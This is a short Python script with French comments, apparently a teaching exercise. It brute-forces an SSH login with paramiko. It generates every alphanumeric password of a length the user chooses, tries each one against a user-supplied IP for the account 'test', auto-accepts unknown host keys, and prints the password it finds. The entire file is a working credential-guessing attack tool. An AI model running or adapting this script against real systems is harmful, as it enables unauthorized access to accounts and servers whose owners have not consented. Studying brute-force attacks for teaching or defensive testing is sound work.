import itertools as it
import string
import paramiko
from datetime import datetime

#Fonction pour se connecter au service SSH
def create_client():
    client= paramiko.SSHClient()
    #insérer ici la gestion des empreintes
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    return client

#Classe du brute forçage
class BF:
    #Initialisation de l'objet
    #On demande le jeu de caractères à utiliser, la taille max du mot de passe
    # et l'IP du service
    def __init__(self, charset, lenght, ip):
        self.charset=charset
        self.lenght=lenght
        self.ip=ip

    def crack(self,username):
        client = create_client()
        print("Client created, Beginning BF!!!!")
        for tester in self.test:
            #Le bloc try permet de tester un bloc de code pour détecter les erreurs.
            try:
                print("Tester {}".format(tester))
                client.connect(self.ip, username=username, password=tester, timeout=0.4)
                return tester
            #Le bloc except permet de traiter l'erreur.
            except:
                pass
            #Le bloc finally permet d'exécuter du code, quel que soit le résultat des blocs try et except.
            finally:
                #Fermer le client entre chaque essai
                client.close()
    
    #@property permet
    @property
    def test(self):
        #Utiliser ici le yield pour générer la liste des mots de passe
        for i in it.product(self.charset, repeat=self.lenght):
            yield "".join(i)

def main():
    charset = string.ascii_letters+string.digits
    tailleMotDePasse = int(input("Quel est la taille du mot de passe a bruteforce ?\n>"))
    ip=input("Sur quel adresse IP voulez vous lancer le bruteforce ?\n>")
    bruteforce=BF(charset, tailleMotDePasse, ip)
    startDate = datetime.now()
    passw=bruteforce.crack('test')
    if passw:
        print("YOUPIIII: {}".format(passw))
        endDate = datetime.now()
        tempsEcoule = (endDate - startDate)
        print("Temps écoulé : "+ str(tempsEcoule))


if __name__ == '__main__':
    main()